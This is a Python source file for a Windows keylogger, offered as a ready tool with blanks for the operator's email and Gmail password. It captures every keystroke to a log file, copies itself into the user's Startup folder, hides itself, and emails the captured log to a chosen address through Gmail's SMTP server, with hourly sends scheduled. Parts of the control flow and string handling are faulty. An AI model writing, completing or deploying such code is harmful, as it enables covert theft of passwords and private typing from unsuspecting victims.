#!/usr/bin/python3

try:
    import schedule
    from pynput import keyboard
    import win32con, win32api
    import smtplib
    import email
    import email.mime.application
    from email.mime.multipart import MIMEMultipart
    from pynput.keyboard import Key, Listener
    import os, sys, time, uuid
except ModuleNotFoundError:
    from subprocess import call
    packets = ["pynput", "smtplib", "email", "schedule", "win32con", "win32api", "MIMEMultipart"]
    call("pip install " + ' '.join(packets), shell=True)
finally:

    EMAIL_ADDR = ""  # YOUR EMAIL
    PASSWD = ""  # YOUR PASSWD FOR GMAIL.COM

    pressedkeys = []

    msg = MIMEMultipart('mixed')

    msg['Subject'] = 'Keylog Data'  # headers
    msg['From'] = ''
    msg['To'] = ''

    filename = 'log.log'
    fp = open(filename, 'rb')
    att = email.mime.application.MIMEApplication(fp.read(), _subtype="log")
    fp.close()
    att.add_header('Content-Disposition', 'attachment', filename=filename)

    msg.attach(att)

    # ----server settings----

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(EMAIL_ADDR, PASSWD)

    # ----server settings----

    def on_press(key):
        try:
            pressedkeys.append(key.char)
        except AttributeError:
            pressedkeys.append(f" {key} ")

        writeToFile(pressedkeys)


    def writeToFile(pressedkeys):
        with open("log.log", "w") as file:
            for keybKey in pressedkeys:
                cleankey = str(keybKey).replace("'" and "Key", "")
                file.write(cleankey)


    def on_release(key):
        if key == keyboard.Key.esc:
            return False


    # function of adding keylogger to win startup

    def startup():
        keylogger = sys.argv[0]
        keylogger_name = os.path.basename(keylogger)
        user_path = os.path.expanduser('~')
        if not os.path.exists(
                f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{keylogger_name}"):
            os.system(
                f'copy "{keylogger}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
        win32api.SetFileAttributes(
            f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{keylogger_name}",
            win32con.FILE_ATTRIBUTE_HIDDEN)


    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
    listener = keyboard.Listener(
        on_press=on_press,
        on_release=on_release)
    listener.start()


    def sendData():
        server.sendmail('sendersEmail', ['hideCopyToSmb'], msg.as_string()) # 1st - sender, 2 - hide copy 
        server.quit()

    # setting invisibility of file

    def invisibility():
        win32api.SetFileAttributes(sys.argv[0], win32con.FILE_ATTRIBUTE_HIDDEN)


    if __name__ == '__main__':
        sendData()
        startup()
        invisibility()
        schedule.every(1).hour.do(sendData)  # sending keylogger data to email
